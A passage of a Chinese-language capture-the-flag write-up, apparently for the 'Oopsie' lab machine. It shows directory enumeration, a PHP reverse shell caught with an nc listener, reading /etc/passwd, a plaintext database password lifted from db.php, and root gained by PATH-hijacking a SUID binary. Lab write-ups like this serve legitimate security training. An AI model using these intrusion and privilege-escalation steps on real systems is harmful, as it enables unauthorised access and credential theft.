+Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>directory<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
+<span class="o">===============================================================</span>
+/images<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">315</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.28.222/images/<span class="o">]</span>
+/.php<span class="w">                 </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">278</span><span class="o">]</span>
+/index.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">10932</span><span class="o">]</span>
+/themes<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">315</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.28.222/themes/<span class="o">]</span>
+/uploads<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">316</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.28.222/uploads/<span class="o">]</span>
+/css<span class="w">                  </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">312</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.28.222/css/<span class="o">]</span>
+/js<span class="w">                   </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">311</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.28.222/js/<span class="o">]</span>
+/fonts<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">314</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.28.222/fonts/<span class="o">]</span>
+</code></pre></div>
+<h3 id="shell">连接shell</h3>
+<p><img alt="image.png" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320163914872.png" /></p>
+<h3 id="ncshell">本地开启nc监听，获取稳定shell</h3>
+<p><strong>上传reverse-shell并触发，获取shell</strong>
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>cp<span class="w"> </span>/usr/share/webshells/php/php-reverse-shell.php<span class="w"> </span>~/Desktop<span class="w"> </span>
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>Desktop<span class="w">                                                 </span>
+</code></pre></div></p>
+<p><img alt="image.png" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320164649390.png" /></p>
+<h3 id="shellshellbinbash-script-q-devnull">切换为交互式shell：<code>SHELL=/bin/bash script -q /dev/null</code></h3>
+<h2 id="kalikali-nc-vnlp-5678-listening-on-any-5678-connect-to-10101490-from-unknown-1012928222-47640-linux-oopsie-4150-76-generic-86-ubuntu-smp-fri-jan-17-172428-utc-2020-x86_64-x86_64-x86_64-gnulinux-084631-up-123-0-users-load-average-000-000-000-user-tty-from-login-idle-jcpu-pcpu-what-uid33www-data-gid33www-data-groups33www-data-binsh-0-cant-access-tty-job-control-turned-off-pwd-whoami-www-data-ls-bin-boot-cdrom-dev-etc-home-initrdimg-initrdimgold-lib-lib64-lostfound-media-mnt-opt-proc-root-run-sbin-snap-srv-sys-tmp-usr-var-vmlinuz-vmlinuzold-shellbinbash-script-q-devnull-www-dataoopsie-whoami-whoami-www-data-www-dataoopsievarwwwhtml-cat-etcpasswd-cat-etcpasswd-rootx00rootrootbinbash-daemonx11daemonusrsbinusrsbinnologin-binx22binbinusrsbinnologin-sysx33sysdevusrsbinnologin-syncx465534syncbinbinsync-gamesx560gamesusrgamesusrsbinnologin-manx612manvarcachemanusrsbinnologin-lpx77lpvarspoollpdusrsbinnologin-mailx88mailvarmailusrsbinnologin-newsx99newsvarspoolnewsusrsbinnologin-uucpx1010uucpvarspooluucpusrsbinnologin-proxyx1313proxybinusrsbinnologin-www-datax3333www-datavarwwwusrsbinnologin-backupx3434backupvarbackupsusrsbinnologin-listx3838mailing-list-managervarlistusrsbinnologin-ircx3939ircdvarrunircdusrsbinnologin-gnatsx4141gnats-bug-reporting-system-adminvarlibgnatsusrsbinnologin-nobodyx6553465534nobodynonexistentusrsbinnologin-systemd-networkx100102systemd-network-managementrunsystemdnetifusrsbinnologin-systemd-resolvex101103systemd-resolverrunsystemdresolveusrsbinnologin-syslogx102106homesyslogusrsbinnologin-messagebusx103107nonexistentusrsbinnologin-_aptx10465534nonexistentusrsbinnologin-lxdx10565534varliblxdbinfalse-uuiddx106110runuuiddusrsbinnologin-dnsmasqx10765534dnsmasqvarlibmiscusrsbinnologin-landscapex108112varliblandscapeusrsbinnologin-pollinatex1091varcachepollinatebinfalse-sshdx11065534runsshdusrsbinnologin-robertx10001000roberthomerobertbinbash-mysqlx111114mysql-servernonexistentbinfalse-www-dataoopsievarwwwhtml"><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>nc<span class="w"> </span>-vnlp<span class="w"> </span><span class="m">5678</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">5678</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.90<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.129.28.222<span class="o">]</span><span class="w"> </span><span class="m">47640</span>
+Linux<span class="w"> </span>oopsie<span class="w"> </span><span class="m">4</span>.15.0-76-generic<span class="w"> </span><span class="c1">#86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+<span class="w"> </span><span class="m">08</span>:46:31<span class="w"> </span>up<span class="w">  </span><span class="m">1</span>:23,<span class="w">  </span><span class="m">0</span><span class="w"> </span>users,<span class="w">  </span>load<span class="w"> </span>average:<span class="w"> </span><span class="m">0</span>.00,<span class="w"> </span><span class="m">0</span>.00,<span class="w"> </span><span class="m">0</span>.00
+USER<span class="w">     </span>TTY<span class="w">      </span>FROM<span class="w">             </span>LOGIN@<span class="w">   </span>IDLE<span class="w">   </span>JCPU<span class="w">   </span>PCPU<span class="w"> </span>WHAT
+<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh:<span class="w"> </span><span class="m">0</span>:<span class="w"> </span>can<span class="err">&#39;</span>t<span class="w"> </span>access<span class="w"> </span>tty<span class="p">;</span><span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span>turned<span class="w"> </span>off
+$<span class="w"> </span><span class="nb">pwd</span>
+/
+$<span class="w"> </span>whoami
+www-data
+$<span class="w"> </span>ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$<span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash<span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>/dev/null
+www-data@oopsie:/$<span class="w"> </span>whoami
+whoami
+www-data
+www-data@oopsie:/var/www/html$<span class="w"> </span>cat<span class="w"> </span>/etc/passwd
+cat<span class="w"> </span>/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing<span class="w"> </span>List<span class="w"> </span>Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats<span class="w"> </span>Bug-Reporting<span class="w"> </span>System<span class="w"> </span><span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd<span class="w"> </span>Network<span class="w"> </span>Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd<span class="w"> </span>Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+robert:x:1000:1000:robert:/home/robert:/bin/bash
+mysql:x:111:114:MySQL<span class="w"> </span>Server,,,:/nonexistent:/bin/false
+www-data@oopsie:/var/www/html$<span class="w"> </span>
+</code></pre></div></h2>
+<h2 id="_4">提权</h2>
+<h3 id="webdbphp">进入web目录下，查看db.php，获取到数据库连接信息</h3>
+<div class="highlight"><pre><span></span><code>www-data@oopsie:/var/www/html/cdn-cgi$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>login
+<span class="nb">cd</span><span class="w"> </span>login
+www-data@oopsie:/var/www/html/cdn-cgi/login$<span class="w"> </span>ls
+ls
+admin.php<span class="w">  </span>db.php<span class="w">  </span>index.php<span class="w">  </span>script.js
+www-data@oopsie:/var/www/html/cdn-cgi/login$<span class="w"> </span>cat<span class="w"> </span>db.php
+cat<span class="w"> </span>db.php
+&lt;?php
+<span class="nv">$conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>mysqli_connect<span class="o">(</span><span class="s1">&#39;localhost&#39;</span>,<span class="s1">&#39;robert&#39;</span>,<span class="s1">&#39;M3g4C0rpUs3r!&#39;</span>,<span class="s1">&#39;garage&#39;</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+www-data@oopsie:/var/www/html/cdn-cgi/login$<span class="w"> </span>
+</code></pre></div>
+<h3 id="robert">登陆robert账户，并查看相关权限</h3>
+<div class="highlight"><pre><span></span><code>www-data@oopsie:/<span class="nv">$su</span><span class="w"> </span>robert
+su<span class="w"> </span>robert
+Password:<span class="w"> </span>M3g4C0rpUs3r!
+
+robert@oopsie:/$<span class="w"> </span>id
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>robert<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>robert<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>robert<span class="o">)</span>,1001<span class="o">(</span>bugtracker<span class="o">)</span>
+robert@oopsie:/$<span class="w"> </span>sudo<span class="w"> </span>-l<span class="w"> </span>
+sudo<span class="w"> </span>-l
+<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>robert:<span class="w"> </span>M3g4C0rpUs3r!
+
+Sorry,<span class="w"> </span>user<span class="w"> </span>robert<span class="w"> </span>may<span class="w"> </span>not<span class="w"> </span>run<span class="w"> </span>sudo<span class="w"> </span>on<span class="w"> </span>oopsie.
+robert@oopsie:/$<span class="w"> </span>
+</code></pre></div>
+<h3 id="robertbugtrackerbugtracker">发现robert用户属于bugtracker组，查找bugtracker</h3>
+<div class="highlight"><pre><span></span><code>robert@oopsie:/$<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-group<span class="w"> </span>bugtracker<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/<span class="w"> </span>-group<span class="w"> </span>bugtracker<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+/usr/bin/bugtracker
+robert@oopsie:/$<span class="w"> </span>/usr/bin/bugtracker<span class="w"> </span>-h
+/usr/bin/bugtracker<span class="w"> </span>
+/usr/bin/bugtracker
+
+------------------
+:<span class="w"> </span>EV<span class="w"> </span>Bug<span class="w"> </span>Tracker<span class="w"> </span>:
+------------------
+
+Provide<span class="w"> </span>Bug<span class="w"> </span>ID:<span class="w"> </span>/root/flag.txt
+/root/flag.txt
+---------------
+
+cat:<span class="w"> </span>/root/reports//root/flag.txt:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory
+
+robert@oopsie:/$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/usr/bin/bugtracker
+ls<span class="w"> </span>-la<span class="w"> </span>/usr/bin/bugtracker
+-rwsr-xr--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>bugtracker<span class="w"> </span><span class="m">8792</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">25</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/usr/bin/bugtracker
+robert@oopsie:/$<span class="w"> </span>
+</code></pre></div>
+<h3 id="tmpcat-shell">进入/tmp目录（因为可写），然后创建名为cat的文件（实际内容是启动一个 Shell），内容如下：</h3>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>cat
+</code></pre></div>
+<h3 id="tmpcat-path-export-pathtmppath-cat-tmp-bin">赋予/tmp/cat执行权限，然后劫持 PATH 环境变量：<code>export PATH=/tmp:$PATH</code>(告诉系统：当有人运行 <code>cat</code> 时，先去 <code>/tmp</code> 找，而不是去系统的 <code>/bin</code> 找)</h3>
+<h3 id="usrbinbugtracker">然后再次执行/usr/bin/bugtracker触发提权</h3>
+<div class="highlight"><pre><span></span><code>robert@oopsie:/$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp
+<span class="nb">cd</span><span class="w"> </span>/tmp
+robert@oopsie:/tmp$<span class="w"> </span>ls
+ls
+robert@oopsie:/tmp$<span class="w"> </span>touch<span class="w"> </span>cat
+touch<span class="w"> </span>cat
+robert@oopsie:/tmp$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>cat<span class="w">          </span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>cat
+robert@oopsie:/tmp$<span class="w"> </span>ls
+ls
+cat
+robert@oopsie:/tmp$<span class="w"> </span>cat<span class="w"> </span>cat
+cat<span class="w"> </span>cat
+/bin/sh
+robert@oopsie:/tmp$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>cat
+chmod<span class="w"> </span>+x<span class="w"> </span>cat
+robert@oopsie:/tmp$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+robert@oopsie:/tmp$<span class="w"> </span>/usr/bin/bugtracker
+/usr/bin/bugtracker
+
+------------------
+:<span class="w"> </span>EV<span class="w"> </span>Bug<span class="w"> </span>Tracker<span class="w"> </span>:
+------------------
+
+Provide<span class="w"> </span>Bug<span class="w"> </span>ID:<span class="w"> </span>auok
+auok
+---------------
+
+<span class="c1"># whoami</span>
+whoami
+root
+<span class="c1"># ls</span>
+ls
+cat
+<span class="c1"># pwd</span>
+<span class="nb">pwd</span>
+/tmp
+<span class="c1"># cd /root</span>
+<span class="nb">cd</span><span class="w"> </span>/root
+<span class="c1"># ls</span>
+ls
+reports<span class="w">  </span>root.txt
+root@oopsie:/#<span class="w"> </span>cat<span class="w"> </span>/root/root.txt
+cat<span class="w"> </span>/root/root.txt
+af13b0bee69f8a877c3faf667f7beacf
+root@oopsie:/#<span class="w"> </span>
+<span class="c1"># su robert</span>
+su<span class="w"> </span>robert
+robert@oopsie:/root$<span class="w"> </span><span class="nb">cd</span>
+<span class="nb">cd</span>
+robert@oopsie:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/
+<span class="nb">cd</span><span class="w"> </span>/
+robert@oopsie:/$<span class="w"> </span>ls
+ls
+bin<span class="w">    </span>dev<span class="w">   </span>initrd.img<span class="w">      </span>lib64<span class="w">       </span>mnt<span class="w">   </span>root<span class="w">  </span>snap<span class="w">  </span>tmp<span class="w">  </span>vmlinuz
+boot<span class="w">   </span>etc<span class="w">   </span>initrd.img.old<span class="w">  </span>lost+found<span class="w">  </span>opt<span class="w">   </span>run<span class="w">   </span>srv<span class="w">   </span>usr<span class="w">  </span>vmlinuz.old
+cdrom<span class="w">  </span>home<span class="w">  </span>lib<span class="w">             </span>media<span class="w">       </span>proc<span class="w">  </span>sbin<span class="w">  </span>sys<span class="w">   </span>var
+robert@oopsie:/$<span class="w"> </span>cat<span class="w"> </span>/home/robert/user.txt
+cat<span class="w"> </span>/home/robert/user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+robert@oopsie:/$<span class="w"> </span>
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+      
+    
+  </body>
+</html>
